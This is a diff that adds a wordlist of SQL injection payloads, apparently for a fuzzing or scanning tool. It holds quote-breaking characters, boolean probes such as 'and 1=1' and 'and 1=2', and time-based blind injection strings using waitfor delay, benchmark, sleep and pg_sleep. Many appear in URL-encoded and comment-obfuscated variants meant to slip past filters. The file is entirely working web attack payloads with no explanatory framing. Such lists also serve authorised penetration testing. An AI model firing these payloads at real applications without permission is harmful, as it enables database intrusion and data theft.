@@ -1,0 +1,90 @@
+'
+"
+/
+/*
+#
+)
+(
+)'
+('
+ and 1=1
+ and 1=2
+ and 1>2
+ and 1<=2
++and+1=1
++and+1=2
++and+1>2
++and+1<=2
+/**/and/**/1=1
+/**/and/**/1=2
+/**/and/**/1>2
+/**/and/**/1<=2
+/**/or/**/1/**/=/**/1
+/**/or/**/1/**/=/**/2
+/**/or/**/1/**/>/**/2
+/**/or/**/1/**/<=/**/2
+ and 50=50
+ and 50=52
+ and 50>52
+ and 50<=52
++and+50=50
++and+50=52
++and+50>52
++and+50<=52
+/**/and/**/50=50
+/**/and/**/50=52
+/**/and/**/50>52
+/**/and/**/50<=52
+/**/or/**/51/**/=/**/51
+/**/or/**/51/**/=/**/52
+/**/or/**/51/**/>/**/52
+/**/or/**/51/**/<=/**/52
+ waitfor delay '0:0:10'--
+; waitfor delay '0:0:10'--
++waitfor+delay+'0:0:10'--
+/**/waitfor/**/delay/**/'0:0:10'--
+%20waitfor%20delay%20'0:0:20'--
+ waitfor delay '0:0:10'--
+; waitfor delay '0:0:10'--
++waitfor+delay+'0:0:10'/*
+/**/waitfor/**/delay/**/'0:0:10'/*
+%20waitfor%20delay%20'0:0:20'/*
+'  waitfor delay '0:0:10'--+
+'+waitfor+delay+'0:0:10'--+
+'/**/ waitfor/**/delay/**/'0:0:10'--+
+'%20waitfor%20delay%20'0:0:20'--+
+ and 0=benchmark(3000000,MD5(1))--
++and+0=benchmark(3000000,MD5(1))+--
+/**/and/**/0=benchmark(3000000,MD5(1))/**/--
+%20and%200=benchmark(3000000,MD5(1))%20--
+; and 0=benchmark(3000000,MD5(1))/*
+ and 0=benchmark(3000000,MD5(1))/*
++and+0=benchmark(3000000,MD5(1))+/*
+/**/and/**/0=benchmark(3000000,MD5(1))/**//*
+%20and%200=benchmark(3000000,MD5(1))%20/*
+' and 0=benchmark(3000000,MD5(1))--+
+'+and+0=benchmark(3000000,MD5(1))+--+
+'/**/and/**/0=benchmark(3000000,MD5(1))/**/--+
+'%20and%200=benchmark(3000000,MD5(1))%20--+
+sleep(__TIME__)#
+1 or sleep(__TIME__)#
+" or sleep(__TIME__)#
+' or sleep(__TIME__)#
+" or sleep(__TIME__)="
+' or sleep(__TIME__)='
+1) or sleep(__TIME__)#
+") or sleep(__TIME__)="
+') or sleep(__TIME__)='
+1)) or sleep(__TIME__)#
+")) or sleep(__TIME__)="
+')) or sleep(__TIME__)='
+pg_sleep(__TIME__)--
+1 or pg_sleep(__TIME__)--
+" or pg_sleep(__TIME__)--
+' or pg_sleep(__TIME__)--
+1) or pg_sleep(__TIME__)--
+") or pg_sleep(__TIME__)--
+') or pg_sleep(__TIME__)--
+1)) or pg_sleep(__TIME__)--
+")) or pg_sleep(__TIME__)--
+')) or pg_sleep(__TIME__)--
